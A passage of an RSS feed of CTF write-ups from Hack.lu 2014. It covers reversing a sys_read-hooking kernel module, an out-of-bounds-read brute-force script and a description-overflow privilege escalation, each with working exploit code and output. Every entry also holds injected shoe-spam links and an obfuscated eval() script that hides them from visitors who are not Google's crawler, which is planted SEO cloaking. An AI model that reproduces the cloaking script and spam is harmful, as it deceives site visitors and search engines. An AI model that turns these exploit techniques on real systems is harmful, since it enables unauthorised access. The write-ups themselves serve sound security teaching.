+Authentication failed!&lt;/pre&gt;&lt;p&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;I copied it to my desktop and &#039;strings&#039; gave me: Joe and omg_joe_is_so_rich were found. Back to server.. enter username and password.. fail.. O_o. Ok, then I tried to check password locally.. and it was correct! &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;It seems to be time to RE.. but:&lt;br&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;&lt;img src=&quot;/sites/default/files/writeups/images/pic200.png&quot; alt=&quot;&quot; width=&quot;529&quot; height=&quot;762&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;nothing new... &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;Ok, back again to server: I copied gold_stash to /tmp and start it.. password was ok, but suid bit was not copied and I was not able to read FLAG. So, something wreck my input or smth else.. I did &#039;lsmod&#039; and found one strange module &#039;joe.ko&#039;.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;Then I&#039;ve started RE it. In short this driver hooks sys_read and modify result of sys_read (name it as &lt;em&gt;usInput&lt;/em&gt;) if it matches some conditions. The conditions are: &lt;/span&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;if (some current_task parameter doesn&#039;t match smth) don&#039;t change anything;&lt;br&gt;&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;if (&lt;em&gt;usInput&lt;/em&gt; == &quot;omg_joe_is_so_rich&quot;) set &lt;em&gt;usInput&lt;/em&gt; to &lt;em&gt;encrypt&lt;/em&gt;(&lt;em&gt;usInput&lt;/em&gt;);&lt;br&gt;&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;if (&lt;/span&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;&lt;em&gt;encrypt&lt;/em&gt;(&lt;em&gt;usInput&lt;/em&gt;) ==&amp;nbsp; &quot;omg_joe_is_so_rich&quot;) &lt;/span&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;set &lt;em&gt;usInput&lt;/em&gt; to &quot;&lt;/span&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;omg_joe_is_so_rich&quot;.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;So I should have found such &lt;em&gt;st&lt;/em&gt; that match &lt;/span&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;&lt;em&gt;encrypt&lt;/em&gt;(&lt;em&gt;st&lt;/em&gt;) ==&amp;nbsp; &quot;omg_joe_is_so_rich&quot;. &lt;em&gt;Encrypt&lt;/em&gt; function code is quite simple:&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;&lt;img src=&quot;/sites/default/files/writeups/images/pic201_0.png&quot; alt=&quot;&quot; width=&quot;509&quot; height=&quot;335&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;and valid password can be recieved by the following code:&lt;/span&gt;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;&amp;gt;&amp;gt;&amp;gt; k0 = &#039;123456789012445678&#039;
+&amp;gt;&amp;gt;&amp;gt; k1 = &#039;omg_joe_is_so_rich&#039;
+&amp;gt;&amp;gt;&amp;gt; &#039;&#039;.join([chr((ord(k0[i])^ord(k1[i]))+4) for i in range(len(k0))])
+&#039;bcXoc]VkTGrE_oKcXT&#039;&lt;/pre&gt;&lt;p&gt;&amp;nbsp;&lt;span style=&quot;color: #222222; font-family: Sanchez; font-size: 16px; line-height: normal; text-align: justify;&quot;&gt;and now...&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;joes_gold@goldstash:~$ ./gold_stash
+          (_/-------------_______________________)
+          `|  /~~~~~~~~~~\                       |
+           ;  |--------(-||______________________|
+           ;  |--------(-| ____________|
+           ;  \__________/&#039;
+         _/__         ___;
+      ,~~    |  __--~~       Gunslinger Joe&#039;s
+     &#039;        ~~| (  |       Private Stash of Gold
+    &#039;      &#039;~~  `____&#039;
+   &#039;      &#039;
+  &#039;      `            Password Protection activated!
+ &#039;       `
+&#039;--------`
+Username: Joe
+Password: bcXoc]VkTGrE_oKcXT
+Access granted!
+$ cat FLAG
+flag{joe_thought_youd_never_find_that_module}&lt;/pre&gt;&lt;p&gt;The flag is: &lt;strong&gt;flag{joe_thought_youd_never_find_that_module}&lt;/strong&gt;&lt;br&gt;&amp;nbsp;&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.juzsports.com/&quot;&gt;Adidas shoes&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;http://www.sb-roscoff.fr/en/bdebbeyshop/en-us/shoes/sneakers.html&quot;&gt;Women&#039;s Designer Sneakers - Luxury Shopping&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-file field-type-file field-label-above&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Attachments:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;span class=&quot;file&quot;&gt;&lt;img class=&quot;file-icon&quot; alt=&quot;Package icon&quot; title=&quot;application/zip&quot; src=&quot;/modules/file/icons/package-x-generic.png&quot; /&gt; &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/joe.ko_.zip&quot; type=&quot;application/zip; length=1957&quot;&gt;joe.ko_.zip&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;field-item odd&quot;&gt;&lt;span class=&quot;file&quot;&gt;&lt;img class=&quot;file-icon&quot; alt=&quot;Package icon&quot; title=&quot;application/zip&quot; src=&quot;/modules/file/icons/package-x-generic.png&quot; /&gt; &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/gold_stash.zip&quot; type=&quot;application/zip; length=3482&quot;&gt;gold_stash.zip&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Fri, 24 Oct 2014 08:00:25 +0000</pubDate>
+ <dc:creator>Triff</dc:creator>
+ <guid isPermaLink="false">86 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/86#comments</comments>
+</item>
+<item>
+ <title>Guess the Flag (Exploit - 200)</title>
+ <link>https://ctfcrew.org/writeup/85</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/pwn&quot;&gt;pwn&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/27&quot;&gt;Hack.lu CTF Quals 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Look at that guy over there! He&#039;s a bandit from the group that robs the stagecoaches in unpredictable intervals. I think he hasn&#039;t been with them for very long, so he can&#039;t tell whether you&#039;re one of them. Try to look like a bandit and talk to him. He probably won&#039;t just tell you their plan for the attack, but maybe you can ask him some questions? &lt;br&gt;&lt;br&gt;&lt;a href=&quot;https://wildwildweb.fluxfingers.net/static/chals/guess_the_flag_cb153ec1260946d13f5f1f0605e4dff9.tar&quot;&gt;Download&lt;/a&gt;&lt;br&gt;nc wildwildweb.fluxfingers.net 1412&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Solution:&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;So we have source code and binary. One look is enough to notice a strange thing in function &lt;em&gt;is_flag_correct&lt;/em&gt;: obviously constant global varibales &lt;em&gt;bin_by_hex&lt;/em&gt; and &lt;em&gt;flag&lt;/em&gt; defined localy! Now we can concentrate in searching vuln and find it in function &lt;em&gt;is_flag_correct&lt;/em&gt;:&lt;/p&gt;&lt;pre class=&quot;brush: cpp; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;    char value1 = bin_by_hex[flag_hex[i*2  ]];
+    char value2 = bin_by_hex[flag_hex[i*2+1]];&lt;/pre&gt;&lt;p&gt;where &lt;em&gt;flag_hex&lt;/em&gt; is a user controlled array on signed bytes! So we can access memory out of array &lt;em&gt;bin_by_hex&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;In binary we see that we can access &lt;em&gt;flag&lt;/em&gt; variable in stack:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/pic100.png&quot; alt=&quot;&quot; height=&quot;410&quot; width=&quot;374&quot;&gt;&lt;/p&gt;&lt;p&gt;So exploitation idea is to send flag of next type:&amp;nbsp;&lt;/p&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;sendFlag = known_flag_part + &quot;%02x&quot;%(brute_byte)
+sendFlag += &#039;&#039;.join([hex_by_pass_el_index(i) for i in range(len(sendFlag),50)])&lt;/pre&gt;&lt;p&gt;where &lt;em&gt;hex_by_pass_el_index(i)&lt;/em&gt; gives two bytes that cause program to fetch &lt;em&gt;i&lt;/em&gt;-th element of original flag. And we get success message when brute_byte is valid and fail message otherwise.&lt;/p&gt;&lt;p&gt;Here is the full exploit code:&lt;/p&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;import string
+import socket
+ERR_SUCCESS = 0
+ERR_CONNECT = -1
+ERR_INVALID_FLAG = -2
+
+host = &#039;wildwildweb.fluxfingers.net&#039;
+port = 1412
+def hex_by_pass_el_index(i):
+	return &#039;0&#039;+chr(0xC0+i)
+def build_hex_pass_guesser(p):
+	r = &#039;&#039;
+	for i in range(len(p)):
+		if p[i]!=None:
+			r += &quot;%02x&quot;%(ord(p[i]))
+		else:
+			r += hex_by_pass_el_index(i)
+	return r
+
+def is_valid(s,p):
+	buf = s.recv(10000)
+	if &#039;guess&#039; not in buf:
+		return ERR_CONNECT
+	s.send(p+&#039;\n&#039;)
+	buf = s.recv(10000)
+	if &#039;Nope&#039; not in buf:
+		return ERR_SUCCESS
+	else:
+		return ERR_INVALID_FLAG
+
+def brute(alph = string.printable):
+	s = None
+	p = [None]*50
+	for k in range(5,len(p)-1):
+		i=0
+		while True:
+			if s==None:
+				s = socket.create_connection((host,port))
+				s.settimeout(5)
+				s.recv(50000)
+			p[k] = alph[i]
+			my_hex_pass = build_hex_pass_guesser(p)
+			bVal = is_valid(s,my_hex_pass)
+			#print(k,i,p,bVal)
+			if bVal==ERR_SUCCESS:
+				break
+			if bVal==ERR_CONNECT:
+				s.close()
+				s=None
+			if bVal==ERR_INVALID_FLAG:
+				i += 1
+		print(p)
+	return p
+
+print(&#039;&#039;.join(brute()))&lt;/pre&gt;&lt;p&gt;&lt;span data-rz-clipboard=&quot;true&quot;&gt;&lt;span data-rz-params=&quot;{&amp;quot;__TYPE&amp;quot;:&amp;quot;TEXT&amp;quot;}&quot;&gt;And the flag is: &lt;/span&gt;&lt;span style=&quot;font-weight: bold;&quot; data-rz-params=&quot;{&amp;quot;__TYPE&amp;quot;:&amp;quot;TEXT&amp;quot;,&amp;quot;T_BOLD&amp;quot;:true}&quot;&gt;flag{6974736a7573746c696b65696e7468656d6f76696573}&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.sneakersbe.com/&quot;&gt;Authentic Sneakers&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.oft.gov.gi/index.php/eeajbishop/us/shop/new/men/shoes&quot;&gt;Men’s shoes&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Thu, 23 Oct 2014 14:46:42 +0000</pubDate>
+ <dc:creator>Dil4rd</dc:creator>
+ <guid isPermaLink="false">85 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/85#comments</comments>
+</item>
+<item>
+ <title>Personnel Database (Exploit - 150)</title>
+ <link>https://ctfcrew.org/writeup/84</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/pwn&quot;&gt;pwn&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/27&quot;&gt;Hack.lu CTF Quals 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;&lt;strong&gt;Task:&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Lots of criminals in this area work for one big boss, but we have been unable to determine who he is. We know that their organization has one central personnel database that might also contain information about their boss, whose username is simply “boss”. However, when you register in their system, you only get access level zero, which is not enough for reading data about the boss - that guy is level 10. Do you think you can get around their protections?&lt;/p&gt;&lt;p&gt;nc wildwildweb.fluxfingers.net 1410&lt;/p&gt;&lt;p&gt;Note: The users dir will be wiped every 5 minutes&lt;/p&gt;&lt;p&gt;And a .c file attached (attached to write-up below)&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Solution:&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;!--break--&gt;&lt;/p&gt;&lt;p&gt;It&#039;s very simple challenge, so i wouldn&#039;t explain how server works. You can figure it out by yourself if you take a closer look at provided&amp;nbsp;source&amp;nbsp;file.&amp;nbsp;&lt;/p&gt;&lt;p&gt;What should we do? We have to find out who is the boss. In this system each user has decription, so we have to read boss&#039;es description. But we can only read description of users with level lesser then ours and we have level 0, and boss has level 10, so we have to promoted our user to level 11 or more and read boss till the end=) let&#039;s pwn:&lt;/p&gt;&lt;p&gt;Vulnarable parts:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;struct userdata *read_userfile(char *user) {
+  struct userdata *res = calloc(1, sizeof(*res));
+  if (res == NULL) return NULL;
+  int fd = open_userfile(user, O_RDONLY);
+  if (fd == -1) return NULL;
+  FILE *f = fdopen(fd, &quot;r&quot;);
+  if (f == NULL) { close(fd); return NULL; }
+  char line[256];
+  while (fgets(line, sizeof(line), f)) {
+    rtrim(line);
+    char *key = line;
+    char *eqsign = strchr(line, &#039;=&#039;);
+    if (!eqsign) continue;
+    *eqsign = &#039;\0&#039;;
+    char *value = eqsign+1;
+
+    if (!strcmp(key, &quot;hash&quot;)) res-&amp;gt;hash = atoll(value);
+    else if (!strcmp(key, &quot;access_level&quot;)) res-&amp;gt;access_level = atoi(value);
+    else if (!strcmp(key, &quot;description&quot;)) strcpy(res-&amp;gt;description, value);
+    else printf(&quot;fatal error: bad key \&quot;%s\&quot; in config, aborting\n&quot;, key), exit(1);
+  }
+  return res;
+}&lt;/pre&gt;&lt;p&gt;and:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;struct userdata {
+  uint32_t hash;
+  unsigned int access_level;
+  char description[512];
+};
+
+.....
+
+  char username[21] = &quot;&quot;;
+  struct userdata *ud = NULL;
+  bool logged_in = false;
+
+  char line[512]; /* last incoming command */
+  while (printf(&quot;&amp;gt; &quot;), fgets(line, sizeof(line), stdin)) {
+    rtrim(line);
+    char *cmd = line;
+    char *params = strchr(line, &#039; &#039;);
+    if (params) {
+      *params = &#039;\0&#039;;
+      params++;
+    }
+
+.....
+
+if (!strcmp(cmd, &quot;set_description&quot;)) {
+      if (!logged_in) { printf(&quot;you must be logged in for this\n&quot;); continue; }
+      if (!params) { printf(&quot;missing description\n&quot;); continue; }
+      strcpy(ud-&amp;gt;description, params);
+      printf(&quot;description set\n&quot;);
+    }&lt;/pre&gt;&lt;p&gt;When you perform &#039;logout&#039; command, your userfile will be written on disk and on login it will be read again. You can notice, that description field has 512 bytes length, command that you can perfom has same 512-bytes length, but system reads userfile by 256-bytes in cycle. So we can overflow decription and in will be splitted in two fields in userfile, cos no checksum used we can rewrite access_level (description is read after access level), including &quot;access_level=11&quot; in description.&lt;/p&gt;&lt;p&gt;So just register, set description, logout, login and pwn boss! (it become even more easy, cos server will notify you if he meets wrong field in userfile, so he helps you to make injection in it).&lt;/p&gt;&lt;p&gt;Exploit:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;import socket
+from time import sleep
+
+s = socket.socket()
+s.connect((&#039;wildwildweb.fluxfingers.net&#039;, 1410))
+
+username = &#039;balalaika2&#039;
+password = &#039;skjdgfksgi&#039;
+
+print s.recv(1024)
+s.send(&quot;register &quot; + username + &#039;:&#039; + password + &#039;\n&#039;)
+sleep(0.5)
+
+print s.recv(1024)
+s.send(&quot;set_description aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaccess_level=11\n&quot;)
+sleep(0.5)
+
+print s.recv(1024)
+s.send(&quot;logout\n&quot;)
+sleep(0.5)
+
+print s.recv(1024)
+s.send(&quot;user &quot;+ username+ &quot;\n&quot;)
+sleep(0.5)
+
+print s.recv(1024)
+s.send(&quot;pass &quot; + password + &quot;\n&quot;)
+sleep(0.5)
+
+print s.recv(1024)
+s.send(&quot;whois boss\n&quot;)
+sleep(0.5)
+
+print s.recv(1024)&lt;/pre&gt;&lt;p&gt;This script produces following output:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;user created successfully
+
+description set
+
+Uh, who are you again? I have forgotten.
+
+username accepted, please provide password
+
+login ok
+
+user	boss
+level	10
+descr	&quot;flag{this_is_why_gets_is_better_than_fgets}&quot;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;font-family: &#039;Helvetica Neue&#039;, Helvetica, Arial, sans-serif; font-size: 14px; background-color: #ffffff;&quot;&gt;And the flag is&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;white-space: pre-wrap;&quot;&gt;flag{this_is_why_gets_is_better_than_fgets}&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.urlfreeze.com/&quot;&gt;spy offers&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.ietp.com/fr/dfeeabshop/collections/jordan&quot;&gt;Jordan&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-file field-type-file field-label-above&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Attachments:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;span class=&quot;file&quot;&gt;&lt;img class=&quot;file-icon&quot; alt=&quot;Package icon&quot; title=&quot;application/zip&quot; src=&quot;/modules/file/icons/package-x-generic.png&quot; /&gt; &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/personnel_database_server.zip&quot; type=&quot;application/zip; length=4277&quot;&gt;personnel_database_server.zip&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;field-item odd&quot;&gt;&lt;span class=&quot;file&quot;&gt;&lt;img class=&quot;file-icon&quot; alt=&quot;Package icon&quot; title=&quot;application/zip&quot; src=&quot;/modules/file/icons/package-x-generic.png&quot; /&gt; &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/solver.py_.zip&quot; type=&quot;application/zip; length=423&quot;&gt;solver.py_.zip&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Thu, 23 Oct 2014 12:24:46 +0000</pubDate>
+ <dc:creator>Triff</dc:creator>
+ <guid isPermaLink="false">84 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/84#comments</comments>
+</item>
+</channel>
+</rss>
